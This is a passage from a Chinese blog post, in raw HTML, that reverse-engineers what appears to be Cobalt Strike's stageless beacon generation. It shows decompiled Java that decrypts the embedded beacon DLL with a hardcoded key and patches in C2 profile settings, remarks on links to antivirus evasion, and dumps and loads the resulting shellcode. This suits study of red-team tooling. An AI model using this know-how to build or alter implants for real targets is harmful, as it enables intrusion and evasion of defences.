string">"stagelesssbeaconPatchSleepMask.x64.dll-Two.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> var30 <span class="token operator">=</span> <span class="token string">"AAAABBBBCCCCDDDDEEEEFFFF"</span><span class="token punctuation">;</span><span class="token keyword">int</span> var31 <span class="token operator">=</span> var29<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>var30<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var31 <span class="token operator">></span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span> var32 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">bString</span><span class="token punctuation">(</span>var27<span class="token punctuation">)</span><span class="token punctuation">;</span>var29 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">replaceAt</span><span class="token punctuation">(</span>var29<span class="token punctuation">,</span> var32<span class="token punctuation">,</span> var31<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">Settings</span> var37 <span class="token operator">=</span> var23<span class="token punctuation">.</span><span class="token function">buildGuardSettings</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var29 <span class="token operator">=</span> <span class="token class-name">BeaconGuardrails</span><span class="token punctuation">.</span><span class="token function">applyPatch</span><span class="token punctuation">(</span>var29<span class="token punctuation">,</span> var37<span class="token punctuation">,</span> var27<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>var29<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"stagelesPathcEnd.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>var29<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> var33<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">MudgeSanity</span><span class="token punctuation">.</span><span class="token function">logException</span><span class="token punctuation">(</span><span class="token string">"export Beacon stage: "</span> <span class="token operator">+</span> var5<span class="token punctuation">,</span> var33<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>这段代码 从resources&#x2F;beacon.x64.dll 加载 beacon.x64.dll  我们进入函数看看</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var10<span class="token operator">=</span> <span class="token class-name">SleevedResource</span><span class="token punctuation">.</span><span class="token function">readResource</span><span class="token punctuation">(</span>var5<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//resources/beacon.x64.dll</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">readResource</span><span class="token punctuation">(</span><span class="token class-name">String</span> var0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token class-name">B<span class="token punctuation">.</span>A</span><span class="token punctuation">(</span>var0<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">private</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token class-name">String</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span> var2 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">strrep</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> <span class="token string">"resources/"</span><span class="token punctuation">,</span> <span class="token string">"sleeve/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var3 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">readResource</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var3<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">long</span> var7 <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"peiqiF4ck var2: "</span> <span class="token operator">+</span>var2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var6 <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>A</span><span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span>var3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//解密dll</span><span class="token keyword">return</span> var6<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var4 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">readResource</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var4<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">print_error</span><span class="token punctuation">(</span><span class="token string">"Could not find sleeved resource: "</span> <span class="token operator">+</span> var1 <span class="token operator">+</span> <span class="token string">" [ERROR]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">print_stat</span><span class="token punctuation">(</span><span class="token string">"Used internal resource: "</span> <span class="token operator">+</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> var4<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var2 <span class="token operator">=</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">copyOfRange</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> var1<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var3 <span class="token operator">=</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">copyOfRange</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var1<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">16</span><span class="token punctuation">,</span> var1<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Object</span> var4 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var14<span class="token punctuation">;</span><span class="token keyword">synchronized</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>F</span><span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>D</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var14 <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>F</span><span class="token punctuation">.</span><span class="token function">doFinal</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var5 <span class="token operator">=</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">copyOfRange</span><span class="token punctuation">(</span>var14<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">MessageDigest</span><span class="token punctuation">.</span><span class="token function">isEqual</span><span class="token punctuation">(</span>var3<span class="token punctuation">,</span> var5<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">print_error</span><span class="token punctuation">(</span><span class="token string">"[Sleeve] Bad HMAC on "</span> <span class="token operator">+</span> var1<span class="token punctuation">.</span>length <span class="token operator">+</span> <span class="token string">" byte message from resource"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token class-name">Object</span> var6 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var15<span class="token punctuation">;</span><span class="token keyword">synchronized</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var15 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">do_decrypt</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>E</span><span class="token punctuation">,</span> var2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">DataInputStream</span> var7 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>var15<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> var8 <span class="token operator">=</span> var7<span class="token punctuation">.</span><span class="token function">readInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> var9 <span class="token operator">=</span> var7<span class="token punctuation">.</span><span class="token function">readInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var9 <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> var9 <span class="token operator">&lt;=</span> var1<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var10 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span>var9<span class="token punctuation">]</span><span class="token punctuation">;</span>var7<span class="token punctuation">.</span><span class="token function">readFully</span><span class="token punctuation">(</span>var10<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> var9<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> var10<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">print_error</span><span class="token punctuation">(</span><span class="token string">"[Sleeve] Impossible message length: "</span> <span class="token operator">+</span> var9<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var13<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var13<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token class-name">OriginKey</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">99</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token comment">//解密秘钥在第一篇中提到过</span><span class="token class-name">SleevedResource<span class="token punctuation">.</span>Setup</span><span class="token punctuation">(</span><span class="token class-name">OriginKey</span><span class="token punctuation">)</span><span class="token punctuation">;</span>其实加载的是  sleeve<span class="token operator">/</span>beacon<span class="token punctuation">.</span>x64<span class="token punctuation">.</span>dll</code></pre><p>上面代码其实就是解密 下的 sleeve&#x2F;beacon.x64.dll  并且返回解密结果，我们记住这个var10 就是 sleeve&#x2F;beacon.x64.dll  解密后的dll<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241040657.png" alt="代码截图"><br>我们接着往下看我们看到 </p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var11 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>c2profile<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">".http-get.uri"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var12 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">",\\s*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token class-name">ScListener</span><span class="token punctuation">(</span><span class="token class-name">Profile</span> var1<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var2<span class="token punctuation">,</span> <span class="token class-name">Map</span> var3<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>options <span class="token operator">=</span> var3<span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"C2 profile is "</span><span class="token operator">+</span>var3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>c2profile <span class="token operator">=</span> var1<span class="token punctuation">.</span><span class="token function">getVariantProfile</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getVariantName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>pubkey <span class="token operator">=</span> var2<span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>config <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ListenerConfig</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>c2profile<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getVariantName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token class-name">DialogUtils</span><span class="token punctuation">.</span><span class="token function">string</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>options<span class="token punctuation">,</span> <span class="token string">"profile"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>接下来就不贴代码了我们直接贴分析图了</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241041150.png" alt="c2profile-1"><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241042340.png" alt="c2profile-2"><br>我们看到监听器的c2profile 为default<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241043370.png" alt="监听器"><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241043469.png" alt="c2profile-3"><br>这里使用的c2 profile 为默认<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241044058.png" alt="c2profile-4"><br>&#x2F;resources&#x2F;default.profile<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241045083.png" alt="默认配置"><br>读取c2profile里面的配置。可以看到这里c2 profile和免杀是多么息息相关。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241045591.png" alt="读取c2profile-5"><br>读取到的c2配置文件里面的选项配置到我们的shellcode里面。我们之前说过var10就是 sleeve&#x2F;beacon.x64.dll 的内容 var29把dll转成字符串<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241047309.png" alt="模板字符"><br>在beacon.x64.dll  里面找到 AAAABBBBCCCCDDDDEEEEFFFF 把var27里面的东西填入到这里<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241047286.png" alt="填充AAABBB"><br>原来的beacon.x64.dll<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241048103.png" alt="beacon.x64.dll"><br>我们来看path stagelesssbeaconPatchSleepMask.x64.dll-Two.bin 找 41 41 41 41 42 42 42 42 43 43 43 43 44 44 44 44 45 45 45 45 46 46 46 46<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241049842.png" alt="shellcodestagelesssbeaconPatchSleepMask"><br>我们看patch以后替换 AAABBBCCC<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241050551.png" alt="AAABBB"><br>stagelesPathAAABBBCCC.bin  填充 后搜索特征 c9 99 6f 38 68 0c ca 95 26 d2 d5 4f 83 1a 58 f4<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241051003.png" alt="替换后对比截图"><br>2e 2f 2e 2f 2e 2c 2e 26 2e 2c 2e 2f 2e 2c 2f 95<br>然后再经过  var29 &#x3D; BeaconGuardrails.applyPatch(var29, var37, var27);  得到<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241051781.png" alt="applyPatch后截图"><br>接下来在走下一个函数如下图<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241052814.png" alt="走下一个函数"></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token class-name">BeaconDLL</span> var1<span class="token punctuation">,</span> <span class="token class-name">AggressorClient</span> var2<span class="token punctuation">,</span> <span class="token class-name">String</span> var3<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var1<span class="token punctuation">.</span>isForeignListener<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> var1<span class="token punctuation">.</span>originalDLL<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token class-name">Stack</span> var4 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var4<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token class-name">SleepUtils</span><span class="token punctuation">.</span><span class="token function">getScalar</span><span class="token punctuation">(</span>var3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var1<span class="token punctuation">.</span><span class="token function">usesCustomLoaderSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var4<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token class-name">SleepUtils</span><span class="token punctuation">.</span><span class="token function">getScalar</span><span class="token punctuation">(</span>var1<span class="token punctuation">.</span>customDLL<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var4<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token class-name">SleepUtils</span><span class="token punctuation">.</span><span class="token function">getScalar</span><span class="token punctuation">(</span>var1<span class="token punctuation">.</span>customFileName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>var4<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token class-name">SleepUtils</span><span class="token punctuation">.</span><span class="token function">getScalar</span><span class="token punctuation">(</span>var1<span class="token punctuation">.</span>originalDLL<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var4<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token class-name">SleepUtils</span><span class="token punctuation">.</span><span class="token function">getScalar</span><span class="token punctuation">(</span>var1<span class="token punctuation">.</span>fileName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">String</span> var5 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">getScriptEngine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"BEACON_RDLL_GENERATE"</span><span class="token punctuation">,</span> var4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var5 <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> var5<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span> var6 <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var1<span class="token punctuation">.</span><span class="token function">usesCustomLoaderSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var6 <span class="token operator">=</span> var1<span class="token punctuation">.</span>customFileName<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>var6 <span class="token operator">=</span> var1<span class="token punctuation">.</span>fileName<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">String</span> var7 <span class="token operator">=</span> <span class="token string">"Using user modified reflective DLL! DLLName="</span> <span class="token operator">+</span> var6 <span class="token operator">+</span> <span class="token string">" Arch="</span> <span class="token operator">+</span> var3<span class="token punctuation">;</span>var2<span class="token punctuation">.</span><span class="token function">getScriptEngine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">pinfo</span><span class="token punctuation">(</span>var7<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>var5<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> var1<span class="token punctuation">.</span>peProcessedDLL<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>shellcode调用关键<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241053897.png" alt="打印函数执行关键点"><br>在我这个例子。最后的shellcode生成就是 </p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">return</span> var1<span class="token punctuation">.</span>peProcessedDLL<span class="token punctuation">;</span></code></pre><p>这个就是windows exe里面的shellcode也就是 beacon.x64.dll 模版组合</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">this</span><span class="token punctuation">.</span>stager <span class="token operator">=</span> var8<span class="token punctuation">.</span><span class="token function">export</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var6<span class="token punctuation">,</span> var9<span class="token punctuation">,</span> var10<span class="token punctuation">,</span> var11<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//stageless 生成函数 shellcode 生成点</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stager<span class="token punctuation">,</span><span class="token string">"测试是否是shellcode生成点.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//是shelllcode直接上线成功</span></code></pre><p>我们从代码dump后的<br>85874bab056d5e23b1e5c36b95252f37   原来的stagelessbeacon.x64.dll.bin<br/><br>93d637810cb2a9b8b8cded24c5fa534a   测试是否是shellcode生成点.bin <br/><br>94d8a4865853d48a5f6140f69f57f192   stagelesssbeaconPatchSleepMask.x64.dll-Two.bin <br/><br>85874bab056d5e23b1e5c36b95252f37   stagelessbeacondll原来的stagelessbeacon.x64.dll-Two.bin <br/><br>2ead49a5983278e030a65881bcece3cb   stagelesPathcEnd.bin <br/><br>6219863b56ca5c7d63c680ca116d33a5   stagelesPathAAABBBCCC.bin <br/><br>93d637810cb2a9b8b8cded24c5fa534a   pepeProcessedDLL.bin <br/><br>我们使用shellcode加载器加载一下看看<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241055732.png" alt="加载shellcode直接执行"><br>我们点击保存的时候<br>src&#x2F;aggressor&#x2F;dialogs&#x2F;WindowsExecutableStageDialog.java</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">dialogResult</span><span class="token punctuation">(</span><span class="token class-name">String</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"stageless 点击生成:"</span> <span class="token operator">+</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> var2 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>options<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"output"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token keyword">boolean</span> var3 <span class="token operator">=</span> <span class="token class-name">DialogUtils</span><span class="token punctuation">.</span><span class="token function">bool</span><span class="token punctuation">(</span><span class="token keyword">this</span><span 